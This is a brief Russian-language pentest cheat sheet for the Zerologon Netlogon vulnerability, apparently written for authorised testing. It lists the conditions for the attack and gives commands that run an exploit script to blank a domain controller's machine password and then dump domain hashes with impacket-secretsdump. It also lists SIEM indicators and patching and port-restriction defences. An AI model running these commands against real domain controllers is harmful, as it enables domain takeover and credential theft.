# Zerologon (CVE-2020-1472)

## 🎯 Цель атаки
Сбросить пароль машинной учётки контроллера домена через уязвимость в Netlogon.

## 📋 Условия
- DC на неподновлённой версии Windows Server (патч август 2020).
- Доступ к порту 445 DC.

## 🔹 Пошагово
1. Запустить эксплойт:
```bash
python3 set_empty_pw.py DC-NAME 192.168.0.10
```
2. Извлечь хэш:
```bash
impacket-secretsdump -hashes :<hash> 'DOMAIN/DC-NAME$@192.168.0.10'
```
3. Восстановить пароль после теста.

## 📊 SIEM
- Неудачные/успешные Netlogon-сессии.
- Изменение пароля машинного аккаунта.

## 🛡 Защита
- Установить обновления безопасности.
- Ограничить доступ к 445/Netlogon.
